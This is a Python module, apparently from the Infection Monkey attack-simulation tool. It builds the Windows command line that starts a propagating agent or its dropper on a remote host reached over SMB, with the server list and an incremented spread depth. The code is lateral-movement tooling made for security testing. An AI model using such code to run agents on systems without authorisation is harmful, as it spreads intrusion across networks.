from pathlib import PurePath
from typing import Sequence

from infection_monkey.model import CMD_PREFIX, DROPPER_ARG, MONKEY_ARG
from infection_monkey.utils.commands import build_monkey_commandline

DROPPER_CMDLINE_DETACHED_WINDOWS = "%s start cmd /c %%(dropper_path)s %s" % (
    CMD_PREFIX,
    DROPPER_ARG,
)
MONKEY_CMDLINE_DETACHED_WINDOWS = "%s start cmd /c %%(monkey_path)s %s" % (
    CMD_PREFIX,
    MONKEY_ARG,
)


def build_smb_command(
    servers: Sequence[str],
    current_depth: int,
    remote_agent_binary_full_path: str,
    remote_agent_binary_destination_path: PurePath,
) -> str:
    if remote_agent_binary_full_path.lower() != str(remote_agent_binary_destination_path).lower():
        cmdline = DROPPER_CMDLINE_DETACHED_WINDOWS % {
            "dropper_path": remote_agent_binary_full_path
        } + build_monkey_commandline(
            servers,
            current_depth + 1,
            str(remote_agent_binary_destination_path),
        )
    else:
        cmdline = MONKEY_CMDLINE_DETACHED_WINDOWS % {
            "monkey_path": remote_agent_binary_full_path
        } + build_monkey_commandline(servers, current_depth + 1)

    return cmdline
